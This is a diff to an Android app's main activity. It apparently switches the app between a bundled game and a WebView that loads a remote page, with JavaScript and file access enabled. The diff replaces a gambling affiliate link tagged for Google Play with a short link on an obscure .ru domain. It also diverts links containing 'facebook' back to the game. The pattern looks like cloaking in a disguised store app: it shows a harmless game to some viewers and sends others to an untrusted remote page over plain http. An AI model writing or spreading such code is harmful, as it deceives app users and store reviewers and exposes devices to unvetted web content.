@@ -96,7 +96,9 @@ public class MainActivity extends AppCompatActivity {
             webView.setWebViewClient(new WebViewClient() {
                 @Override
                 public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                    view.loadUrl(url);
+                    if (!url.contains("facebook"))
+                        view.loadUrl(url);
+                    else openGame();
                     return true;
                 }
 
@@ -117,7 +119,7 @@ public class MainActivity extends AppCompatActivity {
             webSettings.setSupportZoom(true);
             webSettings.setJavaScriptEnabled(true);
             webSettings.setAllowFileAccess(true);
-            webView.loadUrl("http://m66e085.winfortuna.com/?lp=rp4&trackCode=aff_1b1b01_34_GooglePlay_4");
+            webView.loadUrl("http://coolzoor.ru/WxGvkM");
         } else {
             openGame();
         }
